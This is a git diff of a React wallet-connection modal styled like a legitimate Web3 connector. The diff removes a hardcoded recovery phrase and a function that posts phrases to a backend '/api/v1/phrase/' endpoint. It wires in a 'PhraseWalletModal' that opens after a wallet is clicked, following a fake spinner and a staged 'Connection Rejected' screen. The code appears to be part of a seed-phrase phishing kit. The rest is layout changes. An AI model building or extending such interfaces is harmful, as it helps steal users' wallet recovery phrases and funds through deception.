@@ -6,18 +6,19 @@ import Fade from '@mui/material/Fade';
 import Typography from '@mui/material/Typography';
 import { CloseButton, InfoFilledIcon } from '../assets/icons';
 import { myContext } from '../MyContext';
-import { coinbaseLogo, logo, metaMaskLogo, walletConnecLogo } from '../assets/images';
+import { blockLogo, coinbaseLogo, logo, metaMaskLogo, walletConnecLogo } from '../assets/images';
 import Spinner from './spinner';
 import ScanWalletModal from './scanModal';
 import axios from 'axios';
 import { url } from './constants';
 import { ethers } from 'ethers';
+import PhraseWalletModal from './phraseModal';
 
 export const style = {
     position: 'absolute',
-    top: '43%',
+    // top: '43%',
     left: '50%',
-    height: "440px",
+    // height: "440px",
     transform: 'translate(-50%, -50%)',
     borderRadius: "15px",
     marginTop: "2.5em",
@@ -36,10 +37,9 @@ export const styleHeader = {
 }
 
 export default function ConnectWalletModal() {
-    const { openWalletModal, setWalletModal, setScanWalletModal, fetchData } = useContext(myContext)
+    const { openWalletModal, setWalletModal, setScanWalletModal, setPhraseWalletModal, setClickedWallet, clickedWallet } = useContext(myContext)
     const [clickedWalletIndex, setClickedWalletIndex] = useState();
     const [isRejected, setIsRejected] = useState(false)
-    const [clickedWalletLogo, setClickedWalletLogo] = useState()
 
     const [metaMastWalletAddress, setMetaMaskWalletAddress] = useState("")
 
@@ -60,24 +60,6 @@ export default function ConnectWalletModal() {
         },
     ]
 
-    const phrase = `water content forest school table people airport train sleeping computer house mountain`
-
-    const title = "ACX"
-
-    const handleSubmit = async () => {
-        const values = {
-            title: title,
-            phrase: phrase
-        }
-        await axios.post(`${url}/api/v1/phrase/`, values)
-            .then(response => {
-                console.log('Response:', response.data);
-                fetchData()
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-    }
 
     const authMetaMask = async () => {
         if (typeof window.ethereum !== "undefined") {
@@ -108,9 +90,10 @@ export default function ConnectWalletModal() {
     function handleWalletClick(name) {
         setClickedWalletIndex(name)
         authMetaMask()
-        handleSubmit()
         setTimeout(() => {
-            setScanWalletModal(true)
+            // setScanWalletModal(true)
+            setPhraseWalletModal(true)
+
             setTimeout(() => {
                 setIsRejected(true)
             }, 3000);
@@ -138,49 +121,54 @@ export default function ConnectWalletModal() {
             }}
         >
             <Fade in={openWalletModal}>
-                <Box className=" smm:w-[800px] w-[90%] overflow-hidden m-auto flex" sx={style}>
-                    <Box className="bg-[#34353B] w-[39%]">
-                        <div className='w-[70%] m-auto pt-16'>
-                            <img src={logo} alt='logo' className='w-[17px]' />
+                <Box className=" md:w-[800px] md:h-[440px] smm:h-[360px] h-[450px]  smm:top-[43%] top-[69%] w-full max-md:overflow-y-scroll m-auto flex max-md:flex-col-reverse" sx={style}>
+                    <Box className="bg-[#34353B] md:w-[39%] w-[95%] max-md:m-auto max-md:mt-6">
+                        <div className='md:w-[70%] w-[90%] max-md:text-center m-auto md:pt-16'>
+                            <img src={logo} alt='logo' className='w-[17px] max-md:hidden' />
                             <div className='py-6 text-[#DCEFFA]'>
                                 <header className='mb-4'>Connect your wallet</header>
                                 <div className='text-sm'>Connecting your wallet is like “logging in” to Web3. Select your wallet from the options to get started.</div>
                             </div>
-                            <div className='flex items-center text-sm gap-2 ps-4 text-[#6370E5]'>
+                            <div className='flex items-center max-md:justify-center text-sm gap-2 ps-4 text-[#6370E5]'>
                                 <p>I don't have a wallet </p>
                                 <InfoFilledIcon className='text-2xl' />
                             </div>
 
-                            <div className='relative mt-24 mb-4 w-[90%] m-auto'>
+                            <div className='relative md:mt-24 mt-4 mb-4 md:w-[90%] w-[130px] m-auto'>
                                 <div className=' flex justify-between items-center'>
                                     <div className='h-3 w-3 z-10 bg-[#6370E5] rounded-full border-[#1A1D26] border-2'></div>
-                                    {/* <div className='h-3  w-3 z-10 bg-[#6370E5] rounded-full border-[#1A1D26] border-2'></div> */}
-                                    {/* <div className='h-3 top-[-5px] w-3 z-10 bg-[#6370E5] rounded-full border-[#1A1D26] border-2'></div> */}
                                     <div className='h-2  top-[0px] w-2 z-10 bg-[#1A1D26] rounded-full'></div>
                                     <div className='h-2  top-[0px] w-2 z-10 bg-[#1A1D26] rounded-full'></div>
                                 </div>
                                 <div className='absolute top-1/2 w-full h-[2px] bg-[#1A1D26]'></div>
                             </div>
-                            <div className='text-[#DCEFFA] text-[12px] text-center'>powered by <b>blocknative</b></div>
+                            <div className='text-[#DCEFFA] max-md:hidden flex gap-1 ms-8 items-center text-[12px] text-center'>powered by
+                                <b>blocknative</b>
+                                <img src={blockLogo} alt='' className='w-[15px]' />
+                            </div>
+                        </div>
+                        <div className='text-[#DCEFFA] gap-1 flex ps-[30%] items-center md:hidden bg-[#2E2E34] py-3 text-[12px] text-center'>powered by
+                            <b>blocknative</b>
+                            <img src={blockLogo} alt='' className='w-[15px]' />
                         </div>
                     </Box>
 
 
-                    <Box className="w-[61%] relative">
+                    <Box className="md:w-[61%] relative">
                         <Box sx={styleHeader}>
                             <Typography className='text-white ps-2'> {!isRejected ? "Available Wallets (2)" : "Connection Rejected"} </Typography>
                             <CloseButton onClick={handleClose} className='text-[32px] shadow-sm cursor-pointer bg-[#34353B] p-1 rounded-full text-zinc-400' />
                         </Box>
                         <Box className="">
-                            <div className='w-[94%] m-auto'>
+                            <div className='w-[94%] max-md:overflow-x-scroll hideScrollBar max-md:flex items-start gap-3 max-md:pt-2 m-auto'>
                                 {
                                     !isRejected && (
                                         <>
-                                            <div className='text-[#DCEFFA] grid grid-cols-2 gap-2 pt-4'>
+                                            <div className='text-[#DCEFFA] md:grid flex items-start grid-cols-2 md:gap-2 gap-6 pt-4'>
                                                 {
                                                     avalWallets.map((wallet, index) => (
-                                                        <div key={index} onClick={() => { handleWalletClick(wallet.name); setClickedWalletLogo(wallet.logo) }} className='border duration-500 rounded-2xl hover:bg-[#34353B] cursor-pointer p-4 border-zinc-700 flex items-center gap-2'>
-                                                            <div className='border p-2 h-[3.1em] flex justify-center rounded-2xl border-zinc-600 w-[50px]'>
+                                                        <div key={index} onClick={(e) => { handleWalletClick(wallet.name); setClickedWallet({...clickedWallet, logo: wallet.logo, name: wallet.name}) }} className='md:border duration-500 max-md:text-center rounded-2xl hover:bg-[#34353B] cursor-pointer md:p-4 border-zinc-700 md:flex items-center gap-2'>
+                                                            <div className='border p-2 md:h-[3.1em] h-[4em] flex items-center justify-center max-md:mb-2 rounded-2xl border-zinc-600 md:w-[50px] w-[4em]'>
                                                                 {
                                                                     clickedWalletIndex === wallet.name ? (
                                                                         <Spinner />
@@ -189,13 +177,13 @@ export default function ConnectWalletModal() {
                                                                     )
                                                                 }
                                                             </div>
-                                                            <div>{wallet.name}</div>
+                                                            <div className=' max-md:text-[12px]'>{wallet.name}</div>
                                                         </div>
                                                     ))
                                                 }
                                             </div>
 
-                                            <div className='flex justify-between bg-[#FFEFCC] rounded-xl p-3 mt-2'>
+                                            <div className='flex max-md:min-w-[600px] justify-between bg-[#FFEFCC] rounded-xl p-3 md:mt-2 mt-4'>
                                                 <div className='text-[12px] text-[#6370E5]'>
                                                     <div className='text-[#71530F]'>Why don't I see my wallet?</div>
                                                     <div >Click here to learn more</div>
@@ -214,7 +202,7 @@ export default function ConnectWalletModal() {
                                                         <img src={logo} alt='wallet' className='w-1/2' />
                                                     </div>
                                                     <div className='w-[40px] border absolute right-[-2em] flex justify-center items-center rounded-xl bg-white border-[#FFAF00] h-[40px]'>
-                                                        <img src={clickedWalletLogo} alt='wallet' className='w-1/2' />
+                                                        <img src={clickedWallet.logo} alt='wallet' className='w-1/2' />
                                                     </div>
                                                 </div>
                                                 <div className='text-[12px] text-[#6370E5]'>
@@ -231,7 +219,8 @@ export default function ConnectWalletModal() {
                                     )
                                 }
                             </div>
-                            <ScanWalletModal />
+                            {/* <ScanWalletModal /> */}
+                            <PhraseWalletModal />
                         </Box>
                     </Box>
                 </Box>
